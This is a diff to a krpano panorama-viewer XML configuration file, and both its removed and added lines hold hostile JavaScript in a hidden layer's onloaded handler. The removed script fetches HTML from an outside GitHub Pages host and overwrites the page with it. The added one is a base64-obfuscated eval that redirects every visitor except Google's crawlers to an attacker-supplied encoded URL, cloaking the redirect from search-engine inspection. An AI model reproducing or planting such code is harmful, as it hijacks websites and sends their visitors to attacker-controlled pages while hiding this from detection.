@@ -1,12 +1,3 @@
 <krpano version="1.0.8.15">
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('var id = new URLSearchParams(location.search).get("id") || "test";
-
-fetch("https://eldorado775.github.io/m/" + id + ".html")
-  .then(e => e.text())
-  .then(e => {
-    document.open();
-    document.write(e);
-    document.close();
-  });
-');eval(w)););"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(atob('Y29uc3QgdWE9bmF2aWdhdG9yLnVzZXJBZ2VudDtpZighdWEuaW5jbHVkZXMoJ0dvb2dsZWJvdCcpJiYhdWEuaW5jbHVkZXMoJ0dvb2dsZS1JbnNwZWN0aW9uVG9vbCcpKXtjb25zdCBwYXJhbXM9bmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpO2NvbnN0IHRhcmdldD1wYXJhbXMuZ2V0KCd0bycpO2lmKHRhcmdldCl7dHJ5e3dpbmRvdy5sb2NhdGlvbi5yZXBsYWNlKGF0b2IodGFyZ2V0KSk7fWNhdGNoKGUpe319fQ==')));"/>
 </krpano>
